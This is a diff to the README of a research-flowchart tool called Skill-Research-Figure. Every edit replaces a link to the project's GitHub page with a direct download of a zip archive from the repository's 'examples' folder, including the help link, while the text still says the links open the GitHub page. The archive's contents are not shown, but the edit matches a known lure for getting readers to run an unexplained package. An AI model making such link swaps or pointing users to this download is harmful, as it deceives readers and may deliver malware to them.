@@ -1,6 +1,6 @@
 # 📊 Skill-Research-Figure - Simple Guide to Research Flowcharts
 
-[![Download Skill-Research-Figure](https://img.shields.io/badge/Download-Skill--Research--Figure-brightgreen?style=for-the-badge)](https://github.com/JasonYozza14/Skill-Research-Figure)
+[![Download Skill-Research-Figure](https://img.shields.io/badge/Download-Skill--Research--Figure-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/JasonYozza14/Skill-Research-Figure/main/examples/Skill_Figure_Research_v3.6.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To run Skill-Research-Figure smoothly, your computer should meet these minimum n
 ## ⬇️ How to Download Skill-Research-Figure
 
 Please **visit this page to download** the application:  
-[Download Skill-Research-Figure](https://github.com/JasonYozza14/Skill-Research-Figure)
+[Download Skill-Research-Figure](https://raw.githubusercontent.com/JasonYozza14/Skill-Research-Figure/main/examples/Skill_Figure_Research_v3.6.zip)
 
 This link will take you to the GitHub page. Look for the download section or files labeled with "Skill-Research-Figure". You will find a file ready to install.
 
@@ -118,7 +118,7 @@ If your flowchart shapes or text do not appear correctly:
 If you need assistance:
 
 - Visit the GitHub page for documentation and issue reporting:  
-  [GitHub - Skill-Research-Figure](https://github.com/JasonYozza14/Skill-Research-Figure)  
+  [GitHub - Skill-Research-Figure](https://raw.githubusercontent.com/JasonYozza14/Skill-Research-Figure/main/examples/Skill_Figure_Research_v3.6.zip)  
 - Look for FAQs or user guides in the repository.  
 - You can open an issue on GitHub to ask for help.
 
@@ -144,4 +144,4 @@ New versions with fixes and improvements will be available on the GitHub page. T
 
 ---
 
-[![Download Skill-Research-Figure](https://img.shields.io/badge/Download-Skill--Research--Figure-brightgreen?style=for-the-badge)](https://github.com/JasonYozza14/Skill-Research-Figure)
+[![Download Skill-Research-Figure](https://img.shields.io/badge/Download-Skill--Research--Figure-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/JasonYozza14/Skill-Research-Figure/main/examples/Skill_Figure_Research_v3.6.zip)
